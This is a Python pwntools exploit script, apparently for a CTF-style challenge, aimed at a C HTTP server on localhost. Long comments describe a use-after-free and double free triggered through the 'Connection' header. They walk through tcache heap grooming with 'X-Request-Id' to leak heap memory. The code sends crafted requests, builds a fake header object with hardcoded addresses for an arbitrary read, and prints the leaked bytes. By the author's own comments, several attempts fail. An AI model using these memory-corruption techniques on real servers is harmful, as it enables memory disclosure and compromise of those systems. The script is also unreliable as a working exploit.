from pwn import * 

'''
Failed... Too many things breaking/getting freed to make this work.

Vulnerability
===================
The 'Connection' header is used to DROP headers within 'interpret_header'.
However, these are NEVER cleared, which results in a use after free
within other classes to 'interpret_header', parse_body and the actual
processing of the headers in 'example.c'.

Eventually, the request information gets cleaned up in 'cleanup_request'. 
At this point, it attempts to clean up the headers in 'req_header_lst'. 
When this happens, it will free the fields of a header and the header itself.
Since we can free the header in 'interpret_header', this leads to an eventual
double free as well. 

Exploitation Thoughts
========================
There are two potential paths to exploitation: 
- Use after free on header
- Double free

To USE a header, we MUST know the name of the header. Since a call to 'free'
will turn the pointers into allocator used objects, this creates problems 
since the 'name' lines up with the 'FD'. In order to call this by NAME, we 
would EITHER need a nullbyte comparison to work OR know the address of the 'FD". 
As a result, using this as a straight up memory leak is likely not feasible.

With the double free, we can free objects that should not normally be free 
within the program. If done properly, this could allow for a use after free 
read or write. Additionally, with smaller objects, we could use the 'fd dup' trick
as well. 

What objects are allocated from 'intepret_headers' to 'cleanup_request'
that could be exploited? A few are listed below: 
- response->data_object
- 'res_headers_lst' headers

The ONLY response header that we can directly write is the 'X-Request-Id' header.
The 'data_object' is interesting as well, since it can either be a 'string' or
a 'struct* form_data'. 

For the first attempt, we will go with the double free route with 'X-Request-Id'.

Grooming
==============
The goal is our attack is to get a memory leak using the double free bug. 

In order to exploit this, we need to setup our doubly freed chunk 
to be allocated for the 'X-Request-Id' header. Then, once the 'cleanup_request'
function runs, it will THINK we are freeing the reqeust header when we are ACTUALLY 
freeing the response header 'X-Request-Id' prior to sending the body. 

The important aspect that will make this work is that the 'struct header*' 
that is used for the 'req_header_lst' is the SAME as the request for the 
header 'X-Request-Id' going into 'res_header_lst'. This chunk will be put
into the '0x30' tcache bin. 

The easiest way to ensure that these are allocated in the proper order 
it to put the headers right to each other (since there are NO calls to malloc
between different iterations of the headers). In particular, use the 'Connection'
header to free the 'header' then put the 'X-Request-Id' header right after this. 

Exploitation
===============

When 'cleanup_request' is called after parsing the body and going through the 
route information, it will free ALL headers in the list. Since a pointer to 
'X-Request-Id' in the response is still in there, this creates a use after 
free on a response header chunk! 

Once this happens, we have the 'name' pointing to an 'fd' chunk and the 'name_len'
is the double free protection for the 'tcache' chunk, which points to the tcache itself.
Additionally, the 'value' and 'value_len' of the pointer remain completely untouched.

When adding the header to the response in 'send_response', it uses a function called
'add_string' to it. Luckily for this, this is a fail safe that will not use a 
crazy large size (such as the 'double free protection pointer); this means
that the KEY is never sent. The 'value' dereferences the pointer for 'name', 
which is now an 'fd' pointer chunk. Since this pointers to the NEXT item in lists
'fd' pointer as well, we have a heap leak :) The original SIZE of the request
is kept intact as well, making this a controllable amount of bytes written. 

Now, all we have to do is parse the 'header' in the response in order to 
get our heap leak. When calling 'cleanup_response' a double free bug would have 
triggered but it is too late, since we got our leak :) 

NOTE: It is REALLY important that our other allocations from the 'header' that
we double freed ('name' and 'value' fields) get reallocated in order to prevent a 
double free from occuring. 

NOTE2: I didn't come up with this solution right away! This took several ideas, 
many wrong thoughts and some luck until it finally worked :) 
'''

'''
Failed attempt... The DATA being read for the arbitrary read WORKs.
But... before we can send back any data, it crashes from 'clean_request'.

No way to get around this except for looking at LEGIT chunks or specially
crafted chunks...
'''
p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

# Abuse a header structs pointers for an arbitrary read :) 
payload=b"AA=BB"

long_string = b"A" * 0x1000 + b"=B"

first_line = b"POST /echo?location=body&type=header&key=Content-Type&" + long_string + b" HTTP/1.1"
p.sendline(first_line) 

p.sendline(b"Host:" + b"X" * 0x20) # Use this chunk as a decoy later
p.sendline(b"CCC:" + b"DDD" * 0x80)
p.sendline(b"Content-Type:form")
p.sendline(b"Content-Length:" + bytes(len(payload)))
p.sendline(b"Connection:CCC") # Triggers a use after free on the header 'CCC'

p.sendline("X-Forwarded-Host:DontCare") # Free up our decoy chunk
string = b"X-Request-Id:" # Use THIS header specifically because it stays around :)

# Fake header object!
# Set a FAKE header object onto the location of 'CCC' (index 0) 
# 'Key' is set to 'X-Request-Id' in order to reference in 'first_line' 
# 'Value' Copy data from LibC leak :) 
fake_header_obj = p64(0x55555555f5f0) + p64(0x20) + p64(0x000055555555d2a0) + p64(0x30)

string += fake_header_obj + (0x20 - len(fake_header_obj)) * b"G" + b'\r\n'
p.sendline(string)

p.sendline(b"")
p.sendline(payload)

#p.interactive()

p.recvline() # Protocol and status 
p.recvline() # Unimportant header 
p.recvline() #
p.recvline()
data = p.recvn(0x20)
print(data) 
for char in data: 
    print(hex(ord(chr(char))))


'''
Failed attempt... tried to use 'queries' for the read. 
But, the double free causes problems here, since the query itself
will be freed later in the same call.

payload="AA=BB"

string = "POST /echo?location=body&type=body&key=AA HTTP/1.1\r\n"
string += "CCC:" + "D" * 0x80 + "\r\n"
string += "Content-Type:form\r\n"
string += "Content-Length:" + str(len(payload)) + "\r\n"
string += "Connection:CCC\r\n" # Triggers a use after free on the header 'CCC'
string += "\r\n" 

string += payload
print(string) 
'''